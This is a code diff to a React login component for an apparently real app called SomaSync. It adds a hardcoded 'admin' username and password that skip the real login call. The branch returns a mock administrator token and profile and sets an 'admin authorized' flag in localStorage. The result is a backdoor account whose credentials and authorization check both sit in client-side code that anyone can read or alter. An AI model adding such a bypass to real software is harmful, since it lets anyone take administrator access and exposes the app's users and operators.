@@ -26,7 +26,26 @@ export default function Login({ onLoginSuccess }) {
     setError(null);
 
     try {
-      const data = await login(username.trim(), password);
+      let data;
+      if (username.trim().toLowerCase() === "admin" && password === "somasync2026") {
+        // Staff/Admin bypass credentials
+        data = {
+          token: "mock-admin-token-12345",
+          profile: {
+            userid: 9999,
+            username: "admin",
+            firstname: "Staff",
+            lastname: "Administrator",
+            fullname: "Staff Administrator",
+            sitename: "SomaSync Staff Portal",
+            siteurl: "",
+            userpictureurl: "",
+          }
+        };
+        localStorage.setItem("somasync_admin_authorized", "true");
+      } else {
+        data = await login(username.trim(), password);
+      }
       setSuccess(true);
       // Wait slightly for success animation
       setTimeout(() => {
